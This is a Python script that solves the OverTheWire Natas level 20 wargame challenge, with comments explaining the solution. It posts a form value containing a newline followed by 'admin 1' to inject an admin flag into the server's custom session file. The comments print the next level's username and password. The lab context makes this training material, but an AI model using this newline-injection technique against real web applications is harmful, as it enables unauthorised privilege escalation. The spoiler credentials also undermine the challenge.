#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

url = "http://%s.natas.labs.overthewire.org/?debug" % username
session = requests.Session()

# the first call is to make sure we created our own session file on the server
response = session.get(url, auth=(username, password))
content = response.text
# print(session.cookies['PHPSESSID'], "\n")
soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)
print("=" * 80)

# here we are posting data to that same session file on the server
post_data = {"name": "ayhaga\nadmin 1"}
response = session.post(url, data=post_data, auth=(username, password))
content = response.text
# print(session.cookies['PHPSESSID'], "\n")
soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)
print("=" * 80)

# this call is to be able to see the credantials
response = session.get(url, auth=(username, password))
content = response.text
# print(session.cookies['PHPSESSID'], "\n")
soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)
print("=" * 80)


# this time we got an /index-source.html
# the develpoer seems to need to store the session created by each user in
# a file with random name, but with his created session_set_save_handler() functions
# and as we are doing this challenge from a python script, we are able to
# log to the server with the same session which means for this challenge
# same file that we can even change it's data to the one that guarantees us a
# successful login
#
# we got it right:
# Username: natas21
# Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
